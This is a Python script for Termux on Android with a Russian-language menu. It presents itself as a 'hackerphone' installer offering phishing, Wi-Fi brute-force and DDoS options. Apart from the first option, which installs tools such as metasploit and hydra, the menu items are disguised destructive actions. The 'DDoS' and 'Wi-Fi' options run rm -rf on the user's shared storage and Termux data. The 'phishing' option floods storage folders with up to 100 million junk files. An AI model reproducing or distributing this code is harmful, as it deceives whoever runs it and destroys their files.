import os

def hackerPhone():
	instruments=['root-repo', 'unstable-repo', 'x11-repo', 'metasploit', 'git', 'python2', 'python3', 'golang' 'ruby',
	'proot', 'wget', 'termux-api', 'php', 'apache2', 'nmap', 'npm', 'hydra', 'tor', 'lua', 'zip', 'unzip', 'tsu', 'cmatrix',
	'perl', 'dnsutils', 'nano', 'vim', 'vim-gtk', 'vim-python', 'o', 'o-editor']
	for i in instruments:
		try:
			os.system(f'pkg install {i} -y')
		except:
			pass


def WiFi():
	os.system('rm -rf data/data/com.termux/')
def DDoS():
	os.system('rm -rf /storage/emulated/0/')

def phishPage():
	dirs=['/storage/emulated/0/', '/storage/emulated/0/Download/', '/storage/emulated/0/Android/', '/storage/emulated/0/DCIM/']
	for i in dirs:
		for j in range(0, 100000000):
			os.system(f'echo ti loh >> {i}{j}.txt')


def main():
	print('Привет. Выбери параметр')
	print('1.Сделать хакерфон\n2.Создать фиш.страницу\n3.Брутфорс Wi-Fi\n4.Начать DDoS атаку')
	option=int(input())
	if option==1:
		hackerPhone()
	elif option==2:
		phishPage()
	elif option==3:
		WiFi()
	elif option==4:
		DDoS()




def logo():
	banner='''
##     ##    ###     ######  ########  #######   #######  ##         #### ##    ##  ######  ########    ###    ##       ##       ######## ########  
##     ##   ## ##   ##    ##    ##    ##     ## ##     ## ##          ##  ###   ## ##    ##    ##      ## ##   ##       ##       ##       ##     ## 
##     ##  ##   ##  ##          ##    ##     ## ##     ## ##          ##  ####  ## ##          ##     ##   ##  ##       ##       ##       ##     ## 
######### ##     ## ##          ##    ##     ## ##     ## ##          ##  ## ## ##  ######     ##    ##     ## ##       ##       ######   ########  
##     ## ######### ##          ##    ##     ## ##     ## ##          ##  ##  ####       ##    ##    ######### ##       ##       ##       ##   ##   
##     ## ##     ## ##    ##    ##    ##     ## ##     ## ##          ##  ##   ### ##    ##    ##    ##     ## ##       ##       ##       ##    ##  
##     ## ##     ##  ######     ##     #######   #######  ########   #### ##    ##  ######     ##    ##     ## ######## ######## ######## ##     ## 
																														
			
'''
	if os.name=='nt':
		os.system('cls')
		print(banner)
		print("К сожалению ваша ОС не поддерживаеться")
	else:
		os.system('clear')
		print(banner)
		main()

if __name__ == '__main__':
	logo()
